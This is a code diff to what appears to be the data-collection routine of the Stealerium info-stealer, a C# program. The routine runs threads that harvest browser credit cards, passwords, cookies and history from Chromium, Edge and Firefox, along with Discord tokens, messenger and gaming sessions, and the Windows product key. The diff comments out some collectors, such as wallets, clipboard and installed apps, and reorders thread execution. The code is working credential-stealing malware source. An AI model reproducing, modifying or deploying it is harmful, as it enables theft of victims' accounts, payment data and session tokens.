@@ -24,7 +24,7 @@ namespace Stealerium.Helpers
                     threads.Add(new Thread(() =>
                         FileGrabber.Run(sSavePath + "\\Grabber")
                     ));
-
+                
                 // Chromium & Edge thread (credit cards, passwords, cookies, autofill, history, bookmarks)
                 threads.Add(new Thread(() =>
                 {
@@ -35,7 +35,7 @@ namespace Stealerium.Helpers
                 threads.Add(new Thread(() =>
                     Target.Browsers.Firefox.Recovery.Run(sSavePath + "\\Browsers")
                 ));
-
+                
                 // Write discord tokens
                 threads.Add(new Thread(() =>
                     Discord.WriteDiscord(
@@ -82,7 +82,10 @@ namespace Stealerium.Helpers
                 threads.Add(new Thread(() =>
                     Icq.GetSession(sSavePath + "\\Messenger\\ICQ")
                 ));
+                // Create directory to save system information
+                Directory.CreateDirectory(sSavePath + "\\System");
 
+                
                 // Steam & Uplay sessions collection
                 threads.Add(new Thread(() =>
                 {
@@ -98,7 +101,7 @@ namespace Stealerium.Helpers
                 threads.Add(new Thread(() =>
                     Minecraft.SaveAll(sSavePath + "\\Gaming\\Minecraft")
                 ));
-
+                /*
                 // Write wallets
                 threads.Add(new Thread(() =>
                     Wallets.GetWallets(sSavePath + "\\Wallets")
@@ -131,8 +134,7 @@ namespace Stealerium.Helpers
                     DirectoryTree.SaveDirectories(sSavePath + "\\Directories");
                 }));
 
-                // Create directory to save system information
-                Directory.CreateDirectory(sSavePath + "\\System");
+               
 
                 // Process list & active windows list
                 threads.Add(new Thread(() =>
@@ -169,14 +171,7 @@ namespace Stealerium.Helpers
                     File.WriteAllText(sSavePath + "\\System\\ProductKey.txt",
                         ProductKey.GetWindowsProductKeyFromRegistry())
                 ));
-                // Debug logs
-                threads.Add(new Thread(() =>
-                    Logging.Save(sSavePath + "\\System\\Debug.txt")
-                ));
-                // System info
-                threads.Add(new Thread(() =>
-                    SysInfo.Save(sSavePath + "\\System\\Info.txt")
-                ));
+                
                 // Clipboard text
                 threads.Add(new Thread(() =>
                     File.WriteAllText(sSavePath + "\\System\\Clipboard.txt",
@@ -186,14 +181,21 @@ namespace Stealerium.Helpers
                 threads.Add(new Thread(() =>
                     InstalledApps.WriteAppsList(sSavePath + "\\System")
                 ));
+                */
 
+                // Debug logs
+                threads.Add(new Thread(() =>
+                    Logging.Save(sSavePath + "\\System\\Debug.txt")
+                ));
+                // System info
+                threads.Add(new Thread(() =>
+                    SysInfo.Save(sSavePath + "\\System\\Info.txt")
+                ));
                 // Start all threads
                 foreach (var t in threads)
-                    t.Start();
-
-                // Wait all threads
-                foreach (var t in threads)
-                    t.Join();
+                {
+                    t.Start(); t.Join();
+                }
 
                 return Logging.Log("Report created");
             }
